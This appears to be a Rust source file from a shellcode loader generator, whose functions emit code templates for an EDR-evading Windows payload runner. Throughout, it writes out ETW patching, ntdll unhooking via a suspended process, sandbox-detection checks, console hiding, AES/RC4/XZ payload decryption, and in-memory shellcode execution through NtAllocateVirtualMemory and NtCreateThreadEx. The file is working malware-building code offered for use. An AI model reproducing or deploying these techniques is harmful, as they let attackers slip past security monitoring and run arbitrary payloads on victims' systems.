pub fn main_imports() -> String {
    format!(
        r#"#![allow(warnings)]
use std::mem;
use std::ptr::null_mut;
use winapi::shared::basetsd::SIZE_T;
use winapi::um::processthreadsapi::{{CreateProcessA, OpenProcess, TerminateProcess, PROCESS_INFORMATION}};
use winapi::um::winbase::STARTUPINFOEXA;
use winapi::um::winnt::{{LPSTR}};
use winapi::ctypes::c_void;
use winproc::{{Process}};
use winapi::um::memoryapi::WriteProcessMemory;
use winapi::um::libloaderapi::{{GetProcAddress,LoadLibraryA}};
use ntapi::ntmmapi::{{NtReadVirtualMemory, NtAllocateVirtualMemory,NtWriteVirtualMemory, NtProtectVirtualMemory}};
use ntapi::ntpsapi::{{NtCurrentProcess,NtCreateThreadEx}};
use ntapi::ntobapi::{{NtWaitForSingleObject}};
use std::path::Path;
use pelite::{{ImageMap, Result}};
use pelite::pe64::{{Pe, PeView}};
use std::ptr;
use winapi::um::wincon::GetConsoleWindow;
use winapi::um::winuser::{{ShowWindow, SetWindowPos, SWP_NOZORDER, SWP_NOMOVE, SWP_NOSIZE, HWND_TOPMOST, SW_HIDE}};
use winapi::um::winnt::MAXIMUM_ALLOWED;
"#
    )
}

pub fn elzmaimports() -> String {
    format!(
        r#"use std::io::Cursor;
use xz2::read::XzDecoder;
use base64::decode;
use std::io::Read;
"#
    )
}

pub fn aesimports() -> String {
    format!(
        r#"
    //use std::{{env,fs}};
use libaes::Cipher;
use base64::decode;
"#
    )
}

pub fn rc4imports() -> String {
    format!(
        r#"
use base64::decode;
"#
    )
}

pub fn sandboximports() -> String {
    format!(
        r#"
use winreg::enums::{{HKEY_LOCAL_MACHINE,KEY_READ}};
use winreg::{{RegKey,HKEY}};
use std::{{env,process}};
use std::fs::File;
use std::io::{{BufReader, Read}};
use sha2::{{Digest, Sha256}};
"#
    )
}

pub fn dllstruct() -> String {
    format!(
        r#"
#[no_mangle]
pub extern "C" fn DllRegisterServer() {{
    main()
}}
#[no_mangle]
pub extern "C" fn DllGetClassObject() {{
    main()
}}
#[no_mangle]
pub extern "C" fn DllUnregisterServer() {{
    main()
}}
#[no_mangle]
pub extern "C" fn Run() {{
    main()
}}
    "#
    )
}

pub fn code_snippet(executable_name: &str) -> String {
    format!(
        r#"
static mut sectionSize: usize = 0;
static mut textVirtualAddress: isize = 0;
const HWND_NOTOPMOST: isize = -2;


fn ETW() {{
    unsafe {{
        let modu = "ntdll.dll\0";
        let library = LoadLibraryA(modu.as_ptr() as *const i8);        
        let mthd = [
            "EtwEventWrite\0",
            "EtwNotificationRegister\0",
            "EtwEventRegister\0",
            "EtwEventWriteFull\0",
        ];
        for fun in mthd {{
            let mini = GetProcAddress(library, fun.as_ptr() as *const i8);
            let hook = b"\x48\x33\xc0\xc3";
            WriteProcessMemory(NtCurrentProcess, mini as *mut c_void,hook.as_ptr() as _, hook.len(), null_mut());
        }}
    }}
}}


fn CreateProcess() -> PROCESS_INFORMATION{{
    let mut attrsize: SIZE_T = Default::default();
    let mut pi = PROCESS_INFORMATION::default();
    let mut si = STARTUPINFOEXA::default();
    unsafe {{
        si.StartupInfo.cb = mem::size_of::<STARTUPINFOEXA>() as u32;
        CreateProcessA(
            null_mut(),
            "{}\0".as_ptr() as LPSTR,
            null_mut(),
            null_mut(),
            0,
            0x00000004,
            null_mut(),
            null_mut(),
            &mut si.StartupInfo,
            &mut pi,
        );
    }}
    return pi;
}}

#[cfg(feature = "hide")]
fn hide(){{
    unsafe {{
    let hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);
    SetWindowPos(hwnd, HWND_NOTOPMOST as *mut _, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
    }}

}}


fn main(){{
    #[cfg(feature = "sandbox")]
    sandbox();
    #[cfg(feature = "hide")]
    hide();
    sharedmain();
}}


pub fn sharedmain() {{
    #[cfg(all(feature = "console_mode", feature = "ETW"))]
    println!("[*] Patching ETW...");
    #[cfg(feature = "ETW")]
    ETW();
    let pid = CreateProcess();
    #[cfg(feature = "console_mode")]
    println!("[*] Created Suspended Process {{:?}}", pid.dwProcessId);
    let mut temp : *mut c_void = null_mut();
    let mut netaddr = get_module_base_address("ntdll.dll");
    image_map("C:\\Windows\\System32\\ntdll.dll", netaddr);
    unsafe {{
        let mut base_address = format!("0x{{:x}}", textVirtualAddress);
        let mut base_addr = base_address.as_ptr() as usize;
        #[cfg(feature = "console_mode")]
        println!("[+] Parsing Our Proccess's Ntdll.dll Structure");
        let size: usize = sectionSize;
        let mut image_base_buffer = vec![0 ; size];
        let written: *mut usize = ptr::null_mut();
        let data = NtReadVirtualMemory(pid.hProcess, textVirtualAddress as *mut c_void, image_base_buffer.as_ptr() as _, image_base_buffer.len(), null_mut());
        if data != 0 {{
            #[cfg(feature = "console_mode")]
            println!("[!] Restoring Failed!");
            std::process::exit(1);
        }}
        #[cfg(feature = "console_mode")]
        println!("[+] Restoring Our Proccess's Ntdll.dll .Text Space");
        let write = WriteProcessMemory(NtCurrentProcess, textVirtualAddress as *mut c_void,image_base_buffer.as_ptr() as _, image_base_buffer.len(), written);
        if write != 1 {{
            #[cfg(feature = "console_mode")]
            println!("[!] Restoring Failed!");
            std::process::exit(1);
        }}
        #[cfg(feature = "console_mode")]
        println!("[+] Hooks Flushed Out");
        //TerminateProcess(pid.hProcess, 1);
    }}
    #[cfg(all(feature = "console_mode", feature = "ETW"))]
    println!("[*] Repatching ETW...");
    #[cfg(feature = "ETW")]
    ETW();
    #[cfg(feature = "console_mode")]
    println!("[*] Executing Shellcode");
    shellcode()

}}

fn image_map<P: AsRef<Path> + ?Sized>(path: &P, ntdll_add: isize) -> Result<()> {{
	let path = path.as_ref();
	if let Ok(image) = ImageMap::open(path) {{
		let view = PeView::from_bytes(&image);
        let section = view.expect("REASON").section_headers().by_name(".text").unwrap();
        let data = view.expect("REASON").get_section_bytes(section).unwrap();
        let fulladdr = section.VirtualAddress as isize + ntdll_add;
        #[cfg(feature = "console_mode")]
        println!("[*] Offset of .Text Section: {{:#x?}}", section.VirtualAddress);
        #[cfg(feature = "console_mode")]
        println!("[*] Full Address Mappuing: {{:#x?}}", fulladdr);
        #[cfg(feature = "console_mode")]
        println!("[*] Size: {{}}", section.VirtualSize);
        unsafe {{
        sectionSize = section.VirtualSize as usize;
        textVirtualAddress = fulladdr as isize;
        }}
	}}
    Ok(())
}}


pub fn get_module_base_address(module_name: &str) -> isize {{
    #[cfg(feature = "console_mode")]
    println!("[*] Selected Module: {{}}", module_name);
    let process = Process::current();
    let modules = process.module_list().unwrap();
    #[cfg(feature = "console_mode")]
    println!("[*] Creating Handle to Suspend Process");
    for m in modules {{
        if m.name().unwrap().to_lowercase() == module_name.to_ascii_lowercase() {{
            let handle = m.handle();
            #[cfg(feature = "console_mode")]
            println!("[*] Module's Base Address: {{:#x?}}", handle);
            return handle as isize;
        }}
    }}
    0   
}}

fn shellcode(){{
    unsafe {{
    let mut shellcode = decrypt();
    let mut base_address : *mut c_void = null_mut();
    let mut sellcode_length: usize =  shellcode.len().try_into().unwrap();
    let mut temp = 0;
    #[cfg(feature = "console_mode")]
    println!("[*] Calling NtAllocateVirutalMemory");
     NtAllocateVirtualMemory(NtCurrentProcess,&mut base_address,0, &mut shellcode.len(), 0x00003000, 0x40);
    #[cfg(feature = "console_mode")]
    println!("[*] Calling NtWriteVirtualMemory");
    NtWriteVirtualMemory(NtCurrentProcess,base_address,shellcode.as_ptr() as _,shellcode.len() as usize,null_mut());
    #[cfg(feature = "console_mode")]
    println!("[*] Calling NtProtectVirtualMemory");
    NtProtectVirtualMemory(NtCurrentProcess, &mut base_address, &mut sellcode_length,  0x20, &mut temp);
    let mut thread_handle : *mut c_void = std::ptr::null_mut();
    NtCreateThreadEx(&mut thread_handle, MAXIMUM_ALLOWED, std::ptr::null_mut(), NtCurrentProcess, base_address, std::ptr::null_mut(), 0, 0, 0, 0, std::ptr::null_mut());
    NtWaitForSingleObject(thread_handle, 0, std::ptr::null_mut());


    }}
}}
"#,
        executable_name
    )
}


pub fn sandboxstruct() -> String{
    format!(r#"
    fn sandbox() {{
        DomainChecker();
        CPUChecker(2);
        ShaChecker();
    }}
    fn DomainChecker() {{    
        let hklm: HKEY = HKEY_LOCAL_MACHINE;
        let subkey = r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters";
        let domain_name = RegKey::predef(hklm).open_subkey(subkey)
            .and_then(|keyval| keyval.get_value("Domain").map(|v: String| v)) 
            .unwrap_or_else(|_| "".to_string());
        if !domain_name.is_empty() {{
            println!("[*] Endpoint is domain joined (domain name: {{}}).", domain_name);
        }} else {{
            println!("[!] Endpoint is not domain joined.");
            process::exit(0x0100);
        }}
    }}
    
    fn CPUChecker(num: i32) {{
        let hklm: HKEY = HKEY_LOCAL_MACHINE;
        let subkey = r"SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment";
        let CPU = RegKey::predef(hklm).open_subkey(subkey)
            .and_then(|keyval| keyval.get_value("NUMBER_OF_PROCESSORS").map(|v: String| v))
            .unwrap_or_else(|_| "".to_string()); 
            println!("[*] The number of CPUs is: {{}}", CPU);
            if CPU.parse::<i32>().unwrap() <= num {{
                process::exit(0x0100);
            }} 
    }}
    
    
    fn ShaChecker() -> std::io::Result<()> {{
        let exe_path = env::current_exe()?;
        let file = File::open(exe_path)?;
        let mut buf_reader = BufReader::new(file);
        let mut contents = Vec::new();
        buf_reader.read_to_end(&mut contents)?;
        let mut hasher = Sha256::new();
        hasher.update(&contents);
        let result = hasher.finalize();
        let hash = format!("{{:x}}", result);
        println!("[*] SHA-256 hash of the running file: {{:x}}", result);
        
        let file_name = env::current_exe()
            .ok()
            .and_then(|path| path.file_stem().map(|name| name.to_string_lossy().into_owned()));
        if file_name == Some(hash) {{
            println!("[!] The name of the file is the hash value of the file");
            process::exit(0x0100);
        }} else {{
            println!("[*] The name of the file is NOT the hash value of the file");
        }}
    
        Ok(())
    }}
    
    "#)
}



pub fn elzmadecryption() -> String {
    format!(
        r#"fn decrypt() -> Vec<u8> {{
        unsafe {{
            let encrypted_decoded = base64::decode(&ciphertext).unwrap();
            let key_decoded = base64::decode(&key).unwrap();
            let iv_decoded = base64::decode(&iv).unwrap();
            let mut decoder = XzDecoder::new(Cursor::new(&encrypted_decoded as &[u8]));
            let mut decompressed = Vec::new();
            decoder.read_to_end(&mut decompressed);
            return decompressed
        }}
    }}
    "#
    )
}

pub fn aesdecryption() -> String {
    format!(
        r#"fn decrypt() -> Vec<u8> {{
        unsafe {{
            let encrypted_decoded = base64::decode(&ciphertext).unwrap();
            let key_decoded = base64::decode(&key).unwrap();
            let iv_decoded = base64::decode(&iv).unwrap();
            let mut key_array = [0; 32];
            key_array.copy_from_slice(&key_decoded);
            let cipher = Cipher::new_256(&key_array);
            let decrypted = cipher.cbc_decrypt(&iv_decoded, &encrypted_decoded);
            return decrypted;
        }}
    }}
    "#
    )
}

pub fn rc4decryption() -> String {
    format!(
        r#"fn decrypt() -> Vec<u8> {{
        unsafe {{
            let mut encrypted_decoded = base64::decode(&ciphertext).unwrap();
            let mut key_decoded = base64::decode(&key).unwrap();
            let mut iv_decoded = base64::decode(&iv).unwrap();
            let mut s: [u8; 256] = [0; 256];
            let mut k: [u8; 256] = [0; 256];
        
            for i in 0..256 {{
                s[i] = i as u8;
                k[i] = key_decoded[i % key_decoded.len()];
            }}
        
            let mut j: usize = 0;
            for i in 0..256 {{
                j = (j + s[i] as usize + k[i] as usize) % 256;
                s.swap(i, j);
            }}
        
            let mut i: usize = 0;
            let mut j: usize = 0;
            for x in encrypted_decoded.iter_mut() {{
                i = (i + 1) % 256;
                j = (j + s[i] as usize + k[i] as usize) % 256;
                s.swap(i, j);
                let t = (s[i] as usize + s[j] as usize) % 256;
                *x ^= s[t];
            }}
            return encrypted_decoded;
        }}
    }}
    "#
    )
}

pub fn maincargo() -> String {
    format!(
        r#"
winapi = {{version = "0.3.9", features = ["psapi", "processthreadsapi","winnt","winbase", "impl-default", "memoryapi", "winuser", "wincon", "winbase"]}}
ntapi = "0.4.0"
winproc = "0.6.4"
pelite = "0.9.1""#
    )
}

pub fn elzmacargo() -> String {
    format!(
        r#"
rand = "0.8.4"
xz2 = "0.1.7"
base64 = "0.13.0""#
    )
}

pub fn aescargo() -> String {
    format!(
        r#"
libaes = "0.6.1"
base64 = "0.13.0""#
    )
}

pub fn rc4cargo() -> String {
    format!(
        r#"
base64 = "0.13.0"

"#
    )
}

pub fn sandboxcargo() -> String {
    format!(
        r#"
winreg = "*"
sha2 = "0.10.6"

"#
    )
}



pub fn auxcargo() -> String {
    format!(
        r#"
[features]
sandbox = []
hide = []
console_mode = []
ETW = []

[profile.dev]
#opt-level = 'z'     # Optimize for size
lto = true          # Enable link-time optimization
codegen-units = 1   # Reduce number of codegen units to increase optimizations
panic = 'abort'     # Abort on panic
strip = true        # Strip symbols from binary*
"#
    )
}
